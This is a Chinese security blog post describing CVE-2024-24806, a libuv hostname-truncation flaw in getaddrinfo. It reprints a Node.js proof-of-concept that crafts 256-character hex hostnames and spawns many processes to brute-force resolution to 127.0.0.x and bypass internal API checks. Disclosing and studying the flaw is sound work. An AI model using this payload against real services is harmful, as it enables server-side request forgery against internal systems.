#  H1：价值4860$的 CVE漏洞   
道玄安全  道玄网安驿站   2024-05-04 08:01  
  
**“**  
 CVE-2024-24806  
**”**  
  
  
    看到了，**关注一下**不吃亏啊，点个赞转发一下啦，WP看不下去的，可以B站搜：**标松君**，UP主录的打靶视频，欢迎关注。顺便宣传一下星球：**重生者安全，** 里面每天会不定期更新**OSCP**备考，**车联网**，**渗透红队**以及**漏洞挖掘工具**等信息分享，欢迎加入；以及想挖**SRC逻辑漏洞**的朋友，可以私聊。  
  
  
  
  
  
01  
  
—  
  
  
  
域名解析  
  
  
  
        日常逛H1，发现了一个域名解析不当的CVE漏洞，作者发现了uv_getaddrinfo 函数 src/unix/getaddrinfo.c （及其 Windows 对应 src/win/getaddrinfo.c 项） 在调用 getaddrinfo 之前将主机名截断为 256 个字符。此行为可被利用来创建类似 0x00007f000001 的地址，这些地址被 视为 getaddrinfo 有效，并可能允许攻击者构建解析为意外 IP 地址的有效负载，从而绕过开发人员检查；该漏洞的出现是由于 hostname_ascii 变量（长度为 256 字节）在 中 uv_getaddrinfo 以及随后在 中 uv__idna_toascii 处理的方式所致。当主机名超过 256 个字符时，它将被截断，而没有终止的 null 字节；根据构建和运行时环境，它可能导致不同的利用方案：  
  
1.例如，在某些 nodejs 构建中，例如随 Kali Linux 分发的 nodejs 构建，内存中的下一个字节恰好是 null 字节，因此截断的主机名有效。  
  
2.在其他构建中，主机名的最后一个字节是随机值 （0-256），但在连续调用中相同，后续字节为 null 字节。这种情况可以通过暴力破解来利用，尤其是在许多Node.js实例并行运行（ pm2 kubernetes 、等）的生产环境中。  
  
3.由于最后一个字节是随机的，因此在某些情况下它是 之一 0-9a-f ，这使得 16 种可能的情况（共 256 种）可用于调用 localhost （127.0.0.x） 并可能绕过内部 API 上的安全措施。调用其他 IP 范围也是如此，  
  
POC：  
```
// nodejs reproduction code:
const dns = require('dns');
async function run(ip, exactIP) {
  let hexIP = ip.split('.').map(x => (+x).toString(16).padStart(2, '0')).join('');
  if (!exactIP) {
    hexIP = hexIP.substring(0, hexIP.length - 1);
  }

  const payload = `0x${'0'.repeat(256-hexIP.length-2)}${hexIP}.example.com`;
  dns.lookup(payload, (err, addr) => {
    if (err); // not successful
    else if (addr === ip) console.log('*', addr);
    else console.log(' ', addr); // resolved to a shifted ip-address
  });
}

if (process.argv[2]) {
  run ('4.2.2.4', true) // exact match, less probable (P=1/256), for kali-like builds works perfectly
  // run('127.0.0.1', false); // any 127.0.0.x, higher probability (P=1/32)
} else {
  const cp = require('child_process')
  for (let i=0; i<1024; ++i) {
    cp.spawn('node', [process.argv[1], 'x'], { stdio: 'inherit' });
  }
}
```  
  
详细报告链接：  
```
https://github.com/libuv/libuv/security/advisories/GHSA-f74f-cvh7-c6q6
```  
  
  
  
  
  
  
  
  
  
  
免责声明：  
### 本人所有文章均为技术分享，均用于防御为目的的记录，所有操作均在实验环境下进行，请勿用于其他用途，否则后果自负。  
  
第二十七条：任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序和工具；明知他人从事危害网络安全的活动，不得为其提供技术支持、广告推广、支付结算等帮助  
  
第十二条：  国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。  
  
任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。  
  
第十三条：  国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。  
  
  
  
  
  
